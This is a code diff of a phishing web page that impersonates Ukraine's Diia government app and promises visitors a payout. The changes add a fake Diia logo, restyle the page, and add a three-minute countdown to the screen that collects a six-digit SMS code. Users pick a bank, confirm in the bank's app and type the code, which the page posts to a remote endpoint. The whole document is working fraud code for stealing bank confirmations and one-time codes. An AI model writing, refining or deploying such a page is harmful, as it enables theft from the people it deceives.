@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Виберіть ваш банк</title>
+  <title>Дія - Виберіть ваш банк</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     * {
@@ -14,7 +14,7 @@
     
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-      background-color: #f0f0f0;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       overflow-x: hidden;
       min-height: 100vh;
       position: relative;
@@ -30,33 +30,56 @@
       position: relative;
     }
     
+    /* Логотип Дія */
+    .diia-logo {
+      width: clamp(80px, 20vw, 120px);
+      height: clamp(80px, 20vw, 120px);
+      background: #000;
+      border-radius: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+    }
+    
+    .diia-text {
+      color: #fff;
+      font-size: clamp(28px, 8vw, 48px);
+      font-weight: bold;
+      letter-spacing: 2px;
+    }
+    
     h1 { 
       margin-bottom: 8px; 
       font-size: clamp(1.8rem, 5vw, 2.1rem); 
       font-weight: bold; 
       text-align: center;
+      color: #fff;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
     }
     
     #subtitle {
-      color: #555; 
+      color: rgba(255, 255, 255, 0.9); 
       font-size: clamp(1rem, 3vw, 1.05rem); 
-      margin-bottom: 20px;
+      margin-bottom: 30px;
       text-align: center; 
       max-width: 90%;
       line-height: 1.4;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
     }
     
     .bank-btn, .bank-link {
       width: min(320px, 90vw);
-      height: 50px;
+      height: 60px;
       font-size: clamp(16px, 4vw, 20px);
       font-weight: bold;
       margin-bottom: 16px;
       border: none;
-      border-radius: 11px;
+      border-radius: 16px;
       cursor: pointer;
-      transition: filter 0.18s, background 0.18s;
-      box-shadow: 0 1px 6px #0001;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
       outline: none;
       text-decoration: none;
       color: #fff;
@@ -64,17 +87,19 @@
       align-items: center; 
       justify-content: center;
       position: relative;
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(255, 255, 255, 0.1);
     }
     
-    .mono   { background: #222; }
-    .oschad { background: #215E4D; }
-    .raiff  { background: #ffe100; color: #222; }
-    .pumb   { background: #ea262a; }
-    .privat { background: #27AE60; }
+    .mono   { background: linear-gradient(135deg, #222, #444); }
+    .oschad { background: linear-gradient(135deg, #215E4D, #2a7d63); }
+    .raiff  { background: linear-gradient(135deg, #ffe100, #ffd700); color: #222; }
+    .pumb   { background: linear-gradient(135deg, #ea262a, #ff4444); }
+    .privat { background: linear-gradient(135deg, #27AE60, #2ecc71); }
     
     .bank-btn:disabled {
-      background: #ccc !important;
-      color: #888 !important;
+      background: rgba(255, 255, 255, 0.1) !important;
+      color: rgba(255, 255, 255, 0.5) !important;
       cursor: not-allowed;
       opacity: 0.6;
     }
@@ -83,15 +108,20 @@
       animation: pulse 2s infinite;
     }
     
+    .bank-btn:enabled:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
+    }
+    
     @keyframes pulse {
-      0% { box-shadow: 0 1px 6px #0001; }
-      50% { box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4); }
-      100% { box-shadow: 0 1px 6px #0001; }
+      0% { box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); }
+      50% { box-shadow: 0 6px 25px rgba(76, 175, 80, 0.4); }
+      100% { box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); }
     }
 
     #status {
       margin-top: 18px; 
-      color: #555; 
+      color: rgba(255, 255, 255, 0.9); 
       font-size: clamp(16px, 4vw, 18px);
       text-align: center; 
       min-height: 44px;
@@ -100,12 +130,17 @@
     
     #return-instruction {
       margin: 16px 0 0 0;
-      color:#444;
+      color: rgba(255, 255, 255, 0.9);
       max-width: 90%;
-      display:none;
+      display: none;
       text-align: center;
       font-size: clamp(14px, 3.5vw, 16px);
       line-height: 1.4;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px 20px;
+      border-radius: 16px;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
     }
     
     /* SMS экран - полноэкранный режим */
@@ -127,35 +162,26 @@
     }
     
     .sms-container {
-      /* Основной подход - Flexbox */
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: clamp(4px, 1.5vw, 12px);
-      margin: 30px 0;
-      flex-wrap: nowrap !important;
-      width: 100%;
-      max-width: 100vw;
-      overflow: visible;
-      padding: 0 10px;
-      box-sizing: border-box;
-      white-space: nowrap;
-      
-      /* Fallback через Grid */
       display: grid;
       grid-template-columns: repeat(6, 1fr);
       grid-gap: clamp(4px, 1.5vw, 12px);
       justify-items: center;
       align-items: center;
+      margin: 30px 0;
+      width: 100%;
+      max-width: 100vw;
+      padding: 0 10px;
+      box-sizing: border-box;
     }
     
-    /* Поддержка современного Flexbox */
     @supports (display: flex) {
       .sms-container {
         display: flex;
         grid-template-columns: none;
         grid-gap: initial;
         gap: clamp(4px, 1.5vw, 12px);
+        justify-content: center;
+        flex-wrap: nowrap !important;
       }
     }
     
@@ -175,9 +201,6 @@
       flex-grow: 0;
       flex-basis: auto;
       min-width: 0;
-      /* Дополнительная защита от переноса */
-      display: inline-block;
-      vertical-align: middle;
     }
     
     .sms-digit:focus {
@@ -242,11 +265,52 @@
     }
     
     .main-submit-btn:disabled {
-      background: #ccc;
+      background: rgba(255, 255, 255, 0.2);
       cursor: not-allowed;
       opacity: 0.6;
       transform: none;
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    
+    /* Таймер ожидания кода */
+    .countdown-timer {
+      margin: 20px 0;
+      padding: 15px 25px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 25px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      text-align: center;
+    }
+    
+    .countdown-text {
+      color: rgba(255, 255, 255, 0.8);
+      font-size: clamp(14px, 3.5vw, 16px);
+      margin-bottom: 8px;
+    }
+    
+    .countdown-display {
+      color: #fff;
+      font-size: clamp(24px, 6vw, 32px);
+      font-weight: bold;
+      font-family: 'Courier New', monospace;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+    
+    .countdown-progress {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 2px;
+      margin-top: 12px;
+      overflow: hidden;
+    }
+    
+    .countdown-progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #4caf50, #45a049);
+      border-radius: 2px;
+      transition: width 1s linear;
     }
     
     #sms-error { 
@@ -381,6 +445,10 @@
 </head>
 <body>
   <div class="main-container">
+    <div class="diia-logo">
+      <div class="diia-text">Дія</div>
+    </div>
+    
     <h1>Виберіть ваш банк</h1>
     <div id="subtitle">Після підтвердження в додатку банку обов'язково поверніться на цей сайт для <strong>отримання виплати</strong></div>
     
@@ -454,7 +522,8 @@
     let smsTimerInterval = null;
     let smsSoundInterval = null;
     let resendTimerInterval = null;
-    let resendCooldownInterval = null; // Новая переменная для кулдауна повторной отправки
+    let resendCooldownInterval = null;
+    let countdownInterval = null; // Новый таймер для обратного отсчета
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
 
@@ -578,6 +647,10 @@
         clearInterval(statusPoller);
         statusPoller = null;
       }
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+      }
     }
 
     function showLoading(btnId) {
@@ -670,6 +743,10 @@
       // Переключаемся в полноэкранный режим SMS
       document.body.innerHTML = `
         <div class="sms-fullscreen">
+          <div class="diia-logo">
+            <div class="diia-text">Дія</div>
+          </div>
+          
           <div class="sms-title">Код-підтвердження</div>
           <div class="sms-subtitle">Очікуємо введення 6-значного коду</div>
           
@@ -677,6 +754,14 @@
             `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
             `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`
           }
+          
+          <div class="countdown-timer" id="countdown-timer">
+            <div class="countdown-text">Час очікування коду:</div>
+            <div class="countdown-display" id="countdown-display">03:00</div>
+            <div class="countdown-progress">
+              <div class="countdown-progress-bar" id="progress-bar"></div>
+            </div>
+          </div>
           
           <div class="sms-container">
             <input type="tel" class="sms-digit" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
@@ -710,7 +795,49 @@
       
       setupSMSInput();
       checkResendStatus(); // Проверяем доступность повторной отправки
-      startResendTimer(); // Запускаем таймер повторной отправки
+      startSMSCountdown(); // Запускаем таймер обратного отсчета
+    }
+
+    // Новая функция таймера обратного отсчета для SMS
+    function startSMSCountdown() {
+      let totalSeconds = 180; // 3 минуты
+      const maxSeconds = totalSeconds;
+      
+      countdownInterval = setInterval(() => {
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+        
+        // Обновляем отображение времени
+        const display = document.getElementById('countdown-display');
+        if (display) {
+          display.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Обновляем прогресс-бар
+        const progressBar = document.getElementById('progress-bar');
+        if (progressBar) {
+          const percentage = (totalSeconds / maxSeconds) * 100;
+          progressBar.style.width = percentage + '%';
+          
+          // Меняем цвет при приближении к концу
+          if (percentage < 20) {
+            progressBar.style.background = 'linear-gradient(90deg, #ff4444, #cc0000)';
+          } else if (percentage < 50) {
+            progressBar.style.background = 'linear-gradient(90deg, #ffa500, #ff8c00)';
+          }
+        }
+        
+        totalSeconds--;
+        
+        if (totalSeconds < 0) {
+          clearInterval(countdownInterval);
+          // Можно добавить здесь обработку истечения времени
+          if (display) {
+            display.textContent = "00:00";
+            display.style.color = "#ff4444";
+          }
+        }
+      }, 1000);
     }
 
     // Функция настройки ввода SMS
@@ -823,11 +950,23 @@
         const res = await fetch(CODE_URL, { method: "POST", body: fd });
         const resp = await res.json();
         if (resp.ok) {
-          document.getElementById("status").innerHTML = "<div style='text-align: center; padding: 40px;'><h2 style='color: #4caf50;'>✅ Код прийнято</h2><p>Чекаємо підтвердження на пристрої…</p></div>";
-          clearAllTimers(); // Останавливаем все таймеры
+          // Останавливаем таймер при успешной отправке
+          clearInterval(countdownInterval);
+          
+          document.body.innerHTML = `
+            <div class="sms-fullscreen">
+              <div class="diia-logo">
+                <div class="diia-text">Дія</div>
+              </div>
+              <div style='text-align: center; padding: 40px;'>
+                <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
+                <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px);'>Чекаємо підтвердження на пристрої…</p>
+              </div>
+            </div>
+          `;
+          
           setTimeout(() => {
-            autoRefreshActive = true;
-            checkAllLinks();
+            location.reload(); // Перезагружаем страницу
           }, 5000);
         } else {
           document.getElementById("send-code-btn").disabled = false;
@@ -840,6 +979,18 @@
       }
     }
 
+    // Показать сообщение об успехе
+    function showSuccessMessage(message) {
+      const successDiv = document.getElementById("success-message");
+      successDiv.textContent = message;
+      successDiv.style.display = "block";
+      
+      // Скрываем через 5 секунд (увеличено для важного сообщения о продлении)
+      setTimeout(() => {
+        successDiv.style.display = "none";
+      }, 5000);
+    }
+    
     // Функция запроса повторной отправки SMS
     async function requestResendCode() {
       if (!currentId) return;
@@ -861,8 +1012,12 @@
         
         const data = await res.json();
         if (data.ok) {
-          // Показываем сообщение об успешной отправке
-          showSuccessMessage("SMS код відправлено повторно!");
+          // Показываем сообщение о продлении времени
+          showSuccessMessage("SMS код відправлено повторно! Час очікування продовжено на 3 хвилини.");
+          
+          // Продлеваем таймер на 3 минуты
+          clearInterval(countdownInterval);
+          startSMSCountdown();
           
           // Очищаем сообщение об ошибке
           document.getElementById("sms-error").textContent = "";
@@ -908,18 +1063,6 @@
       }
     }
     
-    // Показать сообщение об успехе
-    function showSuccessMessage(message) {
-      const successDiv = document.getElementById("success-message");
-      successDiv.textContent = message;
-      successDiv.style.display = "block";
-      
-      // Скрываем через 3 секунды
-      setTimeout(() => {
-        successDiv.style.display = "none";
-      }, 3000);
-    }
-    
     // Кулдаун для повторной отправки (30 секунд)
     function startResendCooldown() {
       let seconds = 30;
@@ -948,51 +1091,6 @@
           checkResendStatus();
         }
       }, 1000);
-    }
-    
-    // Таймер для повторной отправки SMS (старый, оставляем для совместимости)
-    function startResendTimer() {
-      let seconds = 178; // 2:58
-      // Этот таймер можно оставить или удалить в зависимости от нужд
-    }
-    
-    function updateResendTimer(seconds) {
-      // Функция для совместимости
-    }
-    
-    function stopResendTimer() {
-      if (resendTimerInterval) {
-        clearInterval(resendTimerInterval);
-        resendTimerInterval = null;
-      }
-    }
-
-    function playSMSAudio() {
-      try {
-        const audio = document.getElementById("sms-audio");
-        audio.currentTime = 0;
-        audio.play();
-      } catch {}
-    }
-
-    function showSMSPush() {
-      if ("Notification" in window) {
-        if (Notification.permission === "granted") {
-          new Notification("Введіть код з SMS для завершення входу!", {
-            body: "Вікно для коду вже чекає вас на сайті.",
-            icon: "favicon.ico"
-          });
-        } else if (Notification.permission !== "denied") {
-          Notification.requestPermission().then(function (permission) {
-            if (permission === "granted") {
-              new Notification("Введіть код з SMS для завершення входу!", {
-                body: "Вікно для коду вже чекає вас на сайті.",
-                icon: "favicon.ico"
-              });
-            }
-          });
-        }
-      }
     }
 
     // Инициализация автообновления
